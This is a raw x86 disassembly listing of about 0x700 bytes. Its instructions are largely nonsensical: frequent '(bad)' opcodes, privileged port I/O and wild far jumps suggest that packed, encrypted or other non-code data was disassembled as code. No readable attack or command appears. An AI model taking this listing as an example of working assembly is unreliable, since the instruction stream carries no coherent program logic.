  41e632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e633:	in     eax,dx
  41e634:	push   ds
  41e635:	add    esp,DWORD PTR [ebp-0x15]
  41e638:	out    0x6f,al
  41e63a:	pop    esi
  41e63b:	xchg   BYTE PTR [ebx+ecx*4+0x58667ac6],bl
  41e642:	fisubr DWORD PTR [eax-0x6dde0344]
  41e648:	xchg   DWORD PTR [edx-0x5e056c32],esi
  41e64e:	sub    al,0xde
  41e650:	rol    DWORD PTR [esi-0x5],0xf2
  41e654:	mov    WORD PTR [ebp-0x65cc239],ax
  41e65b:	shr    BYTE PTR [eax+0x11d6cd8],cl
  41e661:	add    DWORD PTR [eax],edx
  41e663:	lods   eax,DWORD PTR ds:[esi]
  41e664:	push   esi
  41e665:	test   BYTE PTR [edi+eiz*1-0x34d792d3],bh
  41e66c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e66d:	or     BYTE PTR [esi+edi*8-0x4efbdccc],dl
  41e674:	inc    edi
  41e675:	mov    WORD PTR ds:[ebx-0x75],?
  41e679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e67a:	and    ah,BYTE PTR [edx]
  41e67c:	mov    ebp,DWORD PTR [eax-0x7624ef7b]
  41e682:	js     0x41e66d
  41e684:	or     bl,BYTE PTR [ebp+0x42b613b6]
  41e68a:	jns    0x41e6d1
  41e68c:	test   al,0xcf
  41e68e:	shl    BYTE PTR [edx],cl
  41e690:	inc    edx
  41e691:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e692:	push   0x9b9e28bc
  41e697:	popf   
  41e698:	ret    
  41e699:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e69a:	int3   
  41e69b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e69c:	out    0x5e,eax
  41e69e:	in     eax,dx
  41e69f:	loope  0x41e6fb
  41e6a1:	je     0x41e658
  41e6a3:	fcmovu st,st(0)
  41e6a5:	lea    edi,[edi]
  41e6a7:	pop    eax
  41e6a8:	sar    DWORD PTR [esi],0xeb
  41e6ab:	mov    cl,0xce
  41e6ad:	popf   
  41e6ae:	mov    gs,edi
  41e6b0:	daa    
  41e6b1:	mov    ebx,0x8378c229
  41e6b6:	inc    esp
  41e6b7:	sti    
  41e6b8:	leave  
  41e6b9:	dec    edx
  41e6ba:	pushf  
  41e6bb:	jg     0x41e6b0
  41e6bd:	std    
  41e6be:	fadd   DWORD PTR [ecx]
  41e6c0:	dec    esi
  41e6c1:	jo     0x41e693
  41e6c3:	nop
  41e6c4:	pop    es
  41e6c5:	lock mov bl,0xa7
  41e6c8:	call   DWORD PTR [ebp+0x76]
  41e6cb:	mov    cs:0xdaecf582,eax
  41e6d1:	mov    al,ds:0xeb436d97
  41e6d6:	jecxz  0x41e6f7
  41e6d8:	sub    BYTE PTR [ecx],bh
  41e6da:	fdivr  DWORD PTR [ebx-0x1c]
  41e6dd:	sbb    BYTE PTR [eax-0x26],dl
  41e6e0:	jmp    0xccf89020
  41e6e5:	dec    esi
  41e6e6:	inc    ebx
  41e6e7:	pop    eax
  41e6e8:	sub    al,0xdf
  41e6ea:	(bad)  
  41e6eb:	fnstcw WORD PTR [ebp+0x1c986d7]
  41e6f1:	repnz test eax,0x5a527764
  41e6f7:	xchg   DWORD PTR [ebx],eax
  41e6f9:	jmp    0x3f017559
  41e6fe:	inc    ebp
  41e6ff:	pop    es
  41e700:	mov    esi,edi
  41e702:	rcr    DWORD PTR [edx+esi*8+0x52],0xd3
  41e707:	je     0x41e77a
  41e709:	cmp    esp,esp
  41e70b:	push   esp
  41e70c:	and    al,BYTE PTR [ebp-0x59]
  41e70f:	pop    ebp
  41e710:	xor    DWORD PTR [eax-0xf],0xffffff94
  41e714:	ret    
  41e715:	xor    ebp,ecx
  41e717:	es sub al,0xd7
  41e71a:	push   ds
  41e71b:	xor    al,0x73
  41e71d:	jne    0x41e797
  41e71f:	ret    0xdeaa
  41e722:	mov    BYTE PTR [edi+0x18],dl
  41e725:	not    bl
  41e727:	in     al,0xa0
  41e729:	fimul  WORD PTR [ecx]
  41e72b:	add    BYTE PTR ds:[eax],bl
  41e72e:	int    0x37
  41e730:	pop    edi
  41e731:	inc    ebx
  41e732:	add    DWORD PTR [ecx+0x302a094f],ebx
  41e738:	jo     0x41e736
  41e73a:	xor    eax,0x26170ee3
  41e73f:	sbb    al,0x65
  41e741:	mov    bh,0x52
  41e743:	adc    cl,BYTE PTR [ebx+0x29]
  41e746:	in     eax,dx
  41e747:	mov    eax,ds:0x27453e83
  41e74c:	rcr    BYTE PTR [ebp+0x2],cl
  41e74f:	sbb    eax,ebx
  41e751:	cld    
  41e752:	dec    ebx
  41e753:	push   DWORD PTR [edi+0x716d2386]
  41e759:	inc    ebp
  41e75a:	and    ch,dl
  41e75c:	nop
  41e75d:	call   0xf6deec03
  41e762:	je     0x41e7ba
  41e764:	jmp    0xf8651e28
  41e769:	ret    0x9085
  41e76c:	jp     0x41e70b
  41e76e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e76f:	cmp    al,BYTE PTR [edi-0x55722dcb]
  41e775:	stc    
  41e776:	jge    0x41e72e
  41e778:	int    0xd5
  41e77a:	inc    edx
  41e77b:	push   0xfa3c05a4
  41e780:	or     BYTE PTR [edi],al
  41e782:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e783:	imul   BYTE PTR [ecx]
  41e785:	jne    0x41e729
  41e787:	xor    eax,0x4a45944d
  41e78c:	and    ebx,DWORD PTR [esi+edx*1-0x1565020c]
  41e793:	jnp    0x41e7dc
  41e795:	sub    BYTE PTR [edi-0x20],ch
  41e798:	stc    
  41e799:	pop    ds
  41e79a:	dec    edi
  41e79b:	xchg   esp,eax
  41e79c:	and    bl,BYTE PTR [eax]
  41e79e:	sub    al,0xbd
  41e7a0:	sbb    esi,DWORD PTR [ecx-0x78]
  41e7a3:	das    
  41e7a4:	hlt    
  41e7a5:	lahf   
  41e7a6:	dec    esi
  41e7a7:	xchg   ebp,eax
  41e7a8:	mov    edi,0x3b9d24be
  41e7ad:	(bad)  
  41e7ae:	or     eax,0xe387e59d
  41e7b3:	and    edx,DWORD PTR [edi]
  41e7b5:	or     DWORD PTR [edi+0x17],edx
  41e7b8:	les    cx,DWORD PTR [ecx-0x4060f2b7]
  41e7bf:	push   eax
  41e7c0:	dec    ebx
  41e7c1:	in     eax,0xcc
  41e7c3:	push   DWORD PTR [edi-0x1e]
  41e7c6:	bound  ecx,QWORD PTR [ecx+0x7b]
  41e7c9:	js     0x41e7fc
  41e7cb:	aam    0x0
  41e7cd:	test   al,0x8f
  41e7cf:	ror    eax,cl
  41e7d1:	mov    dh,0x7f
  41e7d3:	xor    BYTE PTR [esi],cl
  41e7d5:	dec    edi
  41e7d6:	adc    al,0xfe
  41e7d8:	mov    edx,0x6450882b
  41e7dd:	adc    al,0x32
  41e7df:	out    0x85,eax
  41e7e1:	sbb    DWORD PTR ds:0xe6e640fa,0x54
  41e7e8:	sub    ecx,ecx
  41e7ea:	inc    eax
  41e7eb:	xchg   ebx,eax
  41e7ec:	sbb    ebx,esi
  41e7ee:	stos   DWORD PTR es:[edi],eax
  41e7ef:	shl    DWORD PTR [edx],0xb2
  41e7f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7f3:	push   ecx
  41e7f4:	int3   
  41e7f5:	cmp    al,ch
  41e7f7:	or     ebp,0xffffffeb
  41e7fa:	dec    edi
  41e7fb:	mov    esi,0xe30dd29b
  41e800:	push   eax
  41e801:	mov    ah,0x92
  41e803:	enter  0x97b8,0xfc
  41e807:	stos   DWORD PTR es:[edi],eax
  41e808:	es in  al,0x9c
  41e80b:	out    dx,eax
  41e80c:	ins    DWORD PTR es:[edi],dx
  41e80d:	push   eax
  41e80e:	pop    ds
  41e80f:	push   edx
  41e810:	cli    
  41e811:	lahf   
  41e812:	ins    DWORD PTR es:[edi],dx
  41e813:	push   ds
  41e814:	xor    al,0x47
  41e816:	adc    DWORD PTR [eax],edx
  41e818:	and    bh,cl
  41e81a:	cmp    al,0xda
  41e81c:	xor    al,0xe2
  41e81e:	jae    0x41e830
  41e820:	push   0xdad89aa9
  41e825:	sar    DWORD PTR [eax+edi*1+0x743f09ef],1
  41e82c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e82d:	into   
  41e82e:	sub    eax,0x511c6956
  41e833:	test   DWORD PTR [ecx+0x47b4259a],eax
  41e839:	mov    ds:0xab93cc3e,eax
  41e83e:	jno    0x41e881
  41e840:	jmp    0x41e7f1
  41e842:	rcl    BYTE PTR [ecx],0x4
  41e845:	ror    BYTE PTR [ebp-0x7eab5d01],cl
  41e84b:	fwait
  41e84c:	ins    BYTE PTR es:[edi],dx
  41e84d:	sbb    al,0xb3
  41e84f:	cmp    edi,eax
  41e851:	push   ebp
  41e852:	popa   
  41e853:	adc    al,0xdc
  41e855:	mov    ch,0xfc
  41e857:	popa   
  41e858:	sbb    BYTE PTR [esi],0xb6
  41e85b:	addr16 and dh,bh
  41e85e:	mov    ch,0x68
  41e860:	and    BYTE PTR [ebx],dh
  41e862:	retf   0x5d64
  41e865:	test   eax,0xdb330c29
  41e86a:	lea    eax,[edi+0x43ba7e3e]
  41e870:	pop    eax
  41e871:	stc    
  41e872:	shl    BYTE PTR [ecx],1
  41e874:	sub    BYTE PTR [eax-0x5876d270],0x49
  41e87b:	mov    esp,0x38cf3657
  41e880:	mov    WORD PTR ds:0x631ff02a,cs
  41e886:	cmp    esi,ecx
  41e888:	aaa    
  41e889:	arpl   WORD PTR [eax-0x5d],bx
  41e88c:	push   edi
  41e88d:	dec    esp
  41e88e:	xor    al,0x55
  41e890:	stos   DWORD PTR es:[edi],eax
  41e891:	sub    bh,dh
  41e893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e894:	adc    DWORD PTR [ecx+0x72540e78],eax
  41e89a:	jns    0x41e8a2
  41e89c:	sbb    al,0xc
  41e89e:	je     0x41e8df
  41e8a0:	(bad)  [ebx+0x229735fd]
  41e8a6:	neg    DWORD PTR [ebx-0x20cd9c5f]
  41e8ac:	sub    bl,BYTE PTR [esp+ebx*4-0x3e]
  41e8b0:	pop    edx
  41e8b1:	ins    DWORD PTR es:[edi],dx
  41e8b2:	test   al,0x53
  41e8b4:	out    dx,al
  41e8b5:	(bad)  
  41e8b6:	call   0xd9276c6a
  41e8bb:	jo     0x41e8e3
  41e8bd:	dec    edx
  41e8be:	xchg   DWORD PTR [ebx],ebp
  41e8c0:	mov    ch,BYTE PTR fs:[ecx-0x26]
  41e8c4:	mov    ebx,0x4c6ff20b
  41e8c9:	sbb    ecx,DWORD PTR [esi]
  41e8cb:	int3   
  41e8cc:	xor    BYTE PTR [eax-0x4e2bf0e3],dl
  41e8d2:	xchg   ebx,esp
  41e8d4:	ror    esi,cl
  41e8d6:	rcr    DWORD PTR [esi],0x5e
  41e8d9:	push   ebx
  41e8da:	jmp    0xcce7:0x55879502
  41e8e1:	xor    ah,BYTE PTR [edx+0x73]
  41e8e4:	add    BYTE PTR [ecx+0x4],ch
  41e8e7:	mov    ebx,0xd8edb908
  41e8ec:	gs mov al,0xb4
  41e8ef:	or     al,0xe3
  41e8f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8f2:	out    dx,eax
  41e8f3:	cmp    al,BYTE PTR [edx]
  41e8f5:	dec    edi
  41e8f6:	sbb    BYTE PTR [ebp+0x57],dl
  41e8f9:	pop    esp
  41e8fa:	mov    cl,0x11
  41e8fc:	inc    edi
  41e8fd:	imul   esi,ebx,0x40c22179
  41e903:	mov    dh,0xc5
  41e905:	(bad)  
  41e906:	clc    
  41e907:	lods   eax,DWORD PTR ds:[esi]
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	cs mov edi,0x292f8546
  41e90f:	mov    edi,0x73a65ec1
  41e914:	xchg   edi,eax
  41e915:	dec    edx
  41e916:	in     al,dx
  41e917:	ja     0x41e8f5
  41e919:	cmp    ebp,DWORD PTR [esi-0x44f2f9b4]
  41e91f:	and    eax,0xf07e14b6
  41e924:	jmp    ecx
  41e926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e927:	sub    BYTE PTR [ecx+0x3a],ah
  41e92a:	mov    cl,0x47
  41e92c:	push   es
  41e92d:	(bad)  
  41e92e:	fsub   DWORD PTR [ecx]
  41e930:	out    0xe1,eax
  41e932:	fbld   TBYTE PTR [esi-0x2f]
  41e935:	aad    0x7d
  41e937:	(bad)  
  41e938:	das    
  41e939:	cmp    ch,0x2f
  41e93c:	in     eax,dx
  41e93d:	mov    edx,0x6382411b
  41e942:	mov    edi,0xa542834b
  41e947:	outs   dx,BYTE PTR ds:[esi]
  41e948:	pop    eax
  41e949:	daa    
  41e94a:	mov    dh,bl
  41e94c:	std    
  41e94d:	sub    eax,0x70d1f6e0
  41e952:	mov    ds:0xae657c9b,al
  41e957:	cdq    
  41e958:	adc    DWORD PTR [ebx],ecx
  41e95a:	test   al,0x64
  41e95c:	push   edx
  41e95d:	push   ecx
  41e95e:	test   eax,0x4135d0c
  41e963:	push   ebx
  41e964:	push   0xfb2e3f96
  41e969:	and    eax,0x9ba75add
  41e96e:	sub    BYTE PTR [ebx+0x3e],dh
  41e971:	dec    ecx
  41e972:	xchg   edx,eax
  41e973:	or     BYTE PTR [ecx-0x10],0xf3
  41e977:	stos   DWORD PTR es:[edi],eax
  41e978:	arpl   WORD PTR [edi+0x17c9506],dx
  41e97e:	ins    BYTE PTR es:[edi],dx
  41e97f:	jae    0x41e9e4
  41e981:	js     0x41e93d
  41e983:	jmp    DWORD PTR [esi]
  41e985:	jbe    0x41e92f
  41e987:	pcmpgtw mm2,QWORD PTR [ebx]
  41e98a:	jo     0x41e9d7
  41e98c:	jle    0x41ea0d
  41e98e:	loop   0x41e9e3
  41e990:	(bad)  
  41e991:	push   edi
  41e992:	ja     0x41e9f8
  41e994:	retf   0x16ec
  41e997:	xor    eax,ebp
  41e999:	nop
  41e99a:	ret    
  41e99b:	xor    eax,DWORD PTR [ebp+0x1b]
  41e99e:	push   ebx
  41e99f:	xor    ebp,ebx
  41e9a1:	mov    bl,0xfe
  41e9a3:	mov    esi,0x5ac98f55
  41e9a8:	ja     0x41e9c8
  41e9aa:	dec    ecx
  41e9ab:	and    al,0xfd
  41e9ad:	aaa    
  41e9ae:	data16 jnp 0x41ea13
  41e9b1:	aas    
  41e9b2:	xor    BYTE PTR [ebx],dl
  41e9b4:	jle    0x41e9c9
  41e9b6:	mov    edx,0xd4a639c5
  41e9bb:	dec    ecx
  41e9bc:	frstor [edx-0x47]
  41e9bf:	jne    0x41e96e
  41e9c1:	and    eax,0x40854dcb
  41e9c6:	dec    ebp
  41e9c7:	pop    esp
  41e9c8:	test   BYTE PTR [esi+eiz*8+0x155b72f5],0x80
  41e9d0:	ins    DWORD PTR es:[edi],dx
  41e9d1:	fwait
  41e9d2:	stos   BYTE PTR es:[edi],al
  41e9d3:	fiadd  WORD PTR ds:0xdc5650f2
  41e9d9:	push   eax
  41e9da:	xchg   esp,eax
  41e9db:	(bad)  
  41e9dc:	mov    ecx,0x2fe39808
  41e9e1:	push   edx
  41e9e2:	add    edx,eax
  41e9e4:	mov    edx,0x24ee555e
  41e9e9:	sbb    eax,0x16dd70ca
  41e9ee:	mov    edi,esi
  41e9f0:	cmp    BYTE PTR [edi],dl
  41e9f2:	mov    ebp,0xd16bca17
  41e9f7:	int3   
  41e9f8:	xchg   ebx,eax
  41e9f9:	pop    ebx
  41e9fa:	int    0x89
  41e9fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9fd:	test   eax,0xb7de12eb
  41ea02:	lods   al,BYTE PTR ds:[esi]
  41ea03:	retf   
  41ea04:	mov    ch,BYTE PTR [edi-0x4]
  41ea07:	pop    ecx
  41ea08:	mov    al,0x80
  41ea0a:	dec    esi
  41ea0b:	xor    BYTE PTR [ecx+0x7b],0x53
  41ea0f:	sahf   
  41ea10:	fwait
  41ea11:	sbb    eax,0xbdca7ee8
  41ea16:	or     edx,DWORD PTR [ebx+ebp*1]
  41ea19:	add    BYTE PTR [esi+0x38],bh
  41ea1c:	fadd   QWORD PTR [ebp+0x55]
  41ea1f:	inc    eax
  41ea20:	xchg   DWORD PTR [ebp+0x41],ebp
  41ea23:	add    edi,ebp
  41ea25:	xchg   BYTE PTR [edi],dh
  41ea27:	inc    edi
  41ea28:	das    
  41ea29:	dec    ebx
  41ea2a:	fwait
  41ea2b:	pop    esp
  41ea2c:	aam    0x75
  41ea2e:	into   
  41ea2f:	mov    esp,0xb90592a8
  41ea34:	xchg   esi,eax
  41ea35:	dec    esi
  41ea36:	outs   dx,DWORD PTR fs:[esi]
  41ea38:	leave  
  41ea39:	outs   dx,DWORD PTR ds:[esi]
  41ea3a:	scas   al,BYTE PTR es:[edi]
  41ea3b:	mov    ds:0x89ff7d,al
  41ea40:	ds push ss
  41ea42:	xlat   BYTE PTR ds:[ebx]
  41ea43:	and    bh,BYTE PTR [ebx]
  41ea45:	and    DWORD PTR [ebx-0x72bdbcec],esi
  41ea4b:	dec    edx
  41ea4c:	push   0xffffff8d
  41ea4e:	in     eax,dx
  41ea4f:	ror    DWORD PTR [edx-0x5951466c],cl
  41ea55:	int    0xc0
  41ea57:	push   0xfc1726f0
  41ea5c:	xor    eax,ebp
  41ea5e:	adc    DWORD PTR [edi+0x3d],ebx
  41ea61:	in     eax,dx
  41ea62:	lods   al,BYTE PTR ds:[esi]
  41ea63:	push   ecx
  41ea64:	dec    ebx
  41ea65:	rcl    ah,0x44
  41ea68:	ds (bad) 
  41ea6a:	rcl    cl,1
  41ea6c:	jg     0x41eac1
  41ea6e:	(bad)  
  41ea6f:	imul   ecx,DWORD PTR [ebp-0x71896455],0x51
  41ea76:	push   ds
  41ea77:	(bad)  
  41ea78:	data16 in al,0xaa
  41ea7b:	or     BYTE PTR [ebx],dl
  41ea7d:	and    DWORD PTR [ecx],ebp
  41ea7f:	int    0xf6
  41ea81:	jns    0x41ead9
  41ea83:	pop    esi
  41ea84:	js     0x41eacb
  41ea86:	add    DWORD PTR [edi-0x7a0bf0e1],ecx
  41ea8c:	jmp    0x94bb:0xe012f27c
  41ea93:	cwde   
  41ea94:	lods   eax,DWORD PTR ds:[esi]
  41ea95:	rol    BYTE PTR [ecx-0x74],1
  41ea98:	imul   BYTE PTR [eax]
  41ea9a:	js     0x41eafd
  41ea9c:	push   ebp
  41ea9d:	cmp    al,0xa7
  41ea9f:	addr16 pushf 
  41eaa1:	mov    bh,0xcd
  41eaa3:	and    ebx,DWORD PTR [bx]
  41eaa6:	rcl    DWORD PTR [ecx+0x62],1
  41eaa9:	and    ecx,DWORD PTR [esi]
  41eaab:	mov    cl,0x58
  41eaad:	and    al,0x6b
  41eaaf:	inc    DWORD PTR [ecx+eiz*1]
  41eab2:	sbb    DWORD PTR [ebp-0xd0bec8c],esp
  41eab8:	gs dec edx
  41eaba:	(bad)
  41eabd:	rol    DWORD PTR [ecx],cl
  41eabf:	push   esp
  41eac0:	adc    dh,al
  41eac2:	cmp    DWORD PTR [ebp+0x65],0xffffffc4
  41eac6:	imul   ebp,DWORD PTR [edi+eax*2],0xe4b5e8aa
  41eacd:	jo     0x41eabf
  41eacf:	dec    ebx
  41ead0:	mov    esp,esp
  41ead2:	push   ebp
  41ead3:	fidivr DWORD PTR [edx]
  41ead5:	sub    al,0xda
  41ead7:	popf   
  41ead8:	mov    edi,0xdb607bcd
  41eadd:	retf   
  41eade:	dec    esp
  41eadf:	xor    ecx,esp
  41eae1:	cs ja  0x41eae3
  41eae4:	inc    ebp
  41eae5:	dec    esi
  41eae6:	sub    DWORD PTR [ebx],ebp
  41eae8:	jecxz  0x41ea73
  41eaea:	inc    edx
  41eaeb:	loope  0x41ea8b
  41eaed:	pop    ebx
  41eaee:	ror    DWORD PTR [edi-0x5d26739c],1
  41eaf4:	push   es
  41eaf5:	popf   
  41eaf6:	mov    al,0x9a
  41eaf8:	pop    edi
  41eaf9:	jg     0x41eaaa
  41eafb:	jmp    0x41eaab
  41eafd:	sbb    ebp,DWORD PTR [edx]
  41eaff:	xchg   DWORD PTR [esi],esp
  41eb01:	outs   dx,DWORD PTR ds:[esi]
  41eb02:	jge    0x41eb74
  41eb04:	sahf   
  41eb05:	jno    0x41eac9
  41eb07:	(bad)  
  41eb08:	pop    ecx
  41eb09:	adc    al,0xd0
  41eb0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb0d:	shr    DWORD PTR [esi],cl
  41eb0f:	pop    eax
  41eb10:	push   ebx
  41eb11:	sub    edi,0x7e24bffa
  41eb17:	dec    esp
  41eb18:	push   edi
  41eb19:	xchg   esi,eax
  41eb1a:	hlt    
  41eb1b:	jnp    0x41eb6b
  41eb1d:	je     0x41eaf7
  41eb1f:	ins    BYTE PTR es:[edi],dx
  41eb20:	das    
  41eb21:	aas    
  41eb22:	and    DWORD PTR [edi],ebx
  41eb24:	ja     0x41eaf7
  41eb26:	popa   
  41eb27:	call   FWORD PTR ds:0xad7a8e96
  41eb2d:	out    dx,al
  41eb2e:	pushf  
  41eb2f:	fdiv   QWORD PTR [ebx+0x29]
  41eb32:	add    al,0x9a
  41eb34:	and    edi,ecx
  41eb36:	nop
  41eb37:	jecxz  0x41eaf8
  41eb39:	dec    eax
  41eb3a:	push   ebp
  41eb3b:	sub    edi,ebp
  41eb3d:	mov    bl,BYTE PTR [eax+0x30]
  41eb40:	inc    ebx
  41eb41:	cmp    ah,BYTE PTR [edx]
  41eb43:	outs   dx,DWORD PTR ds:[esi]
  41eb44:	into   
  41eb45:	inc    ecx
  41eb46:	fwait
  41eb47:	dec    ecx
  41eb48:	xor    BYTE PTR [esi],ah
  41eb4a:	hlt    
  41eb4b:	add    eax,0xa6b2ca01
  41eb50:	mov    al,0x6d
  41eb52:	jp     0x41eb7c
  41eb54:	mov    eax,DWORD PTR [ebx+0x72d69144]
  41eb5a:	pop    ecx
  41eb5b:	inc    eax
  41eb5c:	push   ecx
  41eb5d:	test   BYTE PTR ds:0xd7b086ae,dh
  41eb63:	test   eax,0x9a4dbab7
  41eb68:	mov    dl,ch
  41eb6a:	or     bl,ah
  41eb6c:	out    dx,eax
  41eb6d:	daa    
  41eb6e:	xor    BYTE PTR [eax+edi*8-0x2e],bh
  41eb72:	aad    0x41
  41eb74:	push   0x75
  41eb76:	das    
  41eb77:	xor    edi,eax
  41eb79:	adc    eax,0xc1293fe7
  41eb7e:	(bad)  
  41eb7f:	mov    ah,0x52
  41eb81:	add    ebp,DWORD PTR cs:[ebp-0x4ec7f163]
  41eb88:	inc    ecx
  41eb89:	jb     0x41eb4f
  41eb8b:	lock fdiv DWORD PTR [ebx+0x2f5d1195]
  41eb92:	xor    ebp,DWORD PTR [esp+eax*8-0x5d8a3e80]
  41eb99:	xchg   ecx,eax
  41eb9a:	xchg   ebx,eax
  41eb9b:	mov    edx,0xc1a722cf
  41eba0:	xor    ch,bh
  41eba2:	jns    0x41eb84
  41eba4:	(bad)  
  41eba5:	jge    0x41eb7e
  41eba7:	dec    edi
  41eba8:	xchg   ebp,eax
  41eba9:	fs dec ecx
  41ebab:	or     eax,0x79d82f87
  41ebb0:	dec    esi
  41ebb1:	adc    eax,0x7736958b
  41ebb6:	mov    cl,0x7d
  41ebb8:	sub    bh,BYTE PTR [edx+0xe]
  41ebbb:	dec    ebx
  41ebbc:	in     al,dx
  41ebbd:	jle    0x41ec22
  41ebbf:	dec    edx
  41ebc0:	shr    edi,1
  41ebc2:	test   edx,ebx
  41ebc4:	push   edx
  41ebc5:	(bad)  
  41ebc6:	fdivr  DWORD PTR [ebp+0x1e]
  41ebc9:	test   DWORD PTR [esi+0x56220d6c],ecx
  41ebcf:	sbb    cl,BYTE PTR [ebx+ebp*4]
  41ebd2:	inc    ebx
  41ebd3:	jno    0x41ec32
  41ebd5:	xchg   ebx,eax
  41ebd6:	inc    ebp
  41ebd7:	add    dh,ah
  41ebd9:	mov    bl,0xd5
  41ebdb:	mov    ebx,DWORD PTR [edi-0x40]
  41ebde:	(bad)  
  41ebdf:	pushf  
  41ebe0:	rol    DWORD PTR [eax+0x1f],0xa4
  41ebe4:	push   ds
  41ebe5:	mov    ch,0x4
  41ebe7:	mov    al,BYTE PTR [ebp-0x6]
  41ebea:	scas   eax,DWORD PTR es:[edi]
  41ebeb:	or     edx,ebp
  41ebed:	dec    ebx
  41ebee:	mov    BYTE PTR [ebp-0x37],bl
  41ebf1:	fst    QWORD PTR [edi-0x7f]
  41ebf4:	and    DWORD PTR [ebx+0xdfb4307],ebx
  41ebfa:	hlt    
  41ebfb:	call   0x64b7:0x89177a7e
  41ec02:	xchg   edi,ecx
  41ec04:	sahf   
  41ec05:	in     al,dx
  41ec06:	pop    es
  41ec07:	or     eax,0xcf1c7159
  41ec0c:	arpl   WORD PTR [edx+0x43a306d4],bp
  41ec12:	daa    
  41ec13:	add    cl,dl
  41ec15:	icebp  
  41ec16:	and    edx,DWORD PTR [esi+0x13904c0d]
  41ec1c:	pop    edx
  41ec1d:	ins    DWORD PTR es:[edi],dx
  41ec1e:	xchg   esp,eax
  41ec1f:	pop    edx
  41ec20:	(bad)
  41ec25:	in     al,0x85
  41ec27:	mov    BYTE PTR [ebx-0x6e387931],0x1b
  41ec2e:	xor    al,0x5c
  41ec30:	jl     0x41ebf6
  41ec32:	mov    ch,0x86
  41ec34:	dec    esi
  41ec35:	jno    0x41ec86
  41ec37:	lea    ecx,[esi+0x49]
  41ec3a:	shl    BYTE PTR ds:0xa8e7ca59,cl
  41ec40:	or     bh,0x20
  41ec43:	xchg   ebp,eax
  41ec44:	prefetch BYTE PTR [eax-0x628c3e0f]
  41ec4b:	add    al,0x8c
  41ec4d:	dec    ebx
  41ec4e:	xchg   eax,esp
  41ec50:	sbb    ah,BYTE PTR [ebx+ebp*2-0x7f]
  41ec54:	xor    al,0xf9
  41ec56:	mov    cl,BYTE PTR [edx]
  41ec58:	loopne 0x41ebe3
  41ec5a:	push   edi
  41ec5b:	into   
  41ec5c:	fs out dx,al
  41ec5e:	test   BYTE PTR [eax],al
  41ec60:	jbe    0x41ec4c
  41ec62:	fcom   QWORD PTR [ebx-0x19]
  41ec65:	clc    
  41ec66:	ficomp WORD PTR [esi]
  41ec68:	dec    edi
  41ec69:	mov    dl,BYTE PTR [ecx+0x53c4b2e0]
  41ec6f:	dec    ebp
  41ec70:	ins    BYTE PTR es:[edi],dx
  41ec71:	cld    
  41ec72:	dec    ebx
  41ec73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec74:	dec    ebx
  41ec75:	div    DWORD PTR cs:[eax+0x39d91af4]
  41ec7c:	psrld  mm3,mm7
  41ec7f:	shr    dh,0x27
  41ec82:	inc    ebp
  41ec83:	adc    dl,ah
  41ec85:	inc    ebp
  41ec86:	icebp  
  41ec87:	fsubr  DWORD PTR [ecx-0x58c8bdfa]
  41ec8d:	popa   
  41ec8e:	sub    DWORD PTR [ebx-0x756ef294],edi
  41ec94:	outs   dx,DWORD PTR ds:[esi]
  41ec95:	test   DWORD PTR [edi+0x3b],ecx
  41ec98:	jle    0x41ed0e
  41ec9a:	sub    cl,BYTE PTR [ebp+0x11]
  41ec9d:	sbb    dh,al
  41ec9f:	mov    esi,0x8c1a8bbc
  41eca4:	call   0xbddea90f
  41eca9:	test   ebp,ebx
  41ecab:	pusha  
  41ecac:	push   cs
  41ecad:	xchg   ebx,eax
  41ecae:	mov    ebp,0x9eb13b88
  41ecb3:	jno    0x41ec71
  41ecb5:	inc    edx
  41ecb6:	stc    
  41ecb7:	popf   
  41ecb8:	mov    ch,0x11
  41ecba:	stos   DWORD PTR es:[edi],eax
  41ecbb:	retf   0xf44f
  41ecbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecbf:	mov    eax,0x1284ca92
  41ecc4:	test   esi,0x89ca9057
  41ecca:	retf   
  41eccb:	imul   edi,DWORD PTR [edi],0x16
  41ecce:	jno    0x41ed11
  41ecd0:	fdiv   QWORD PTR [eax+0x36]
  41ecd3:	aad    0x89
  41ecd5:	ja     0x41ece3
  41ecd7:	xor    ch,BYTE PTR [eax]
  41ecd9:	iret   
  41ecda:	or     eax,DWORD PTR [eax]
  41ecdc:	daa    
  41ecdd:	and    eax,0x6c1085cc
  41ece2:	call   0xa15380e
  41ece7:	sahf   
  41ece8:	test   al,0x1e
  41ecea:	psubusw mm0,QWORD PTR ds:[eax-0xc]
  41ecef:	enter  0x755,0xc1
  41ecf3:	sbb    al,0x94
  41ecf5:	scas   eax,DWORD PTR es:[edi]
  41ecf6:	ds mov edx,0x84446c97
  41ecfc:	cmp    eax,0x713b9ca8
  41ed01:	cmc    
  41ed02:	cmp    ecx,esp
  41ed04:	sahf   
  41ed05:	cmp    ah,al
  41ed07:	fwait
  41ed08:	sub    cl,BYTE PTR [ecx]
  41ed0a:	pop    ds
  41ed0b:	jmp    0x41ed41
  41ed0d:	cmp    BYTE PTR [ecx+ebx*1-0x66126b5e],ch
  41ed14:	imul   ebp,ecx,0xffffff8d
  41ed17:	xchg   ecx,eax
  41ed18:	aad    0x1d
  41ed1a:	retf   0xb0b4
  41ed1d:	mov    al,0x70
  41ed1f:	add    BYTE PTR fs:[ebx+0x8b262a3],ch
  41ed26:	inc    ebx
  41ed27:	pusha  
  41ed28:	hlt    
  41ed29:	mov    ch,0x50
  41ed2b:	inc    edx
  41ed2c:	pushfw 
  41ed2e:	stos   DWORD PTR es:[edi],eax
  41ed2f:	and    edi,DWORD PTR [esi+0x4e]
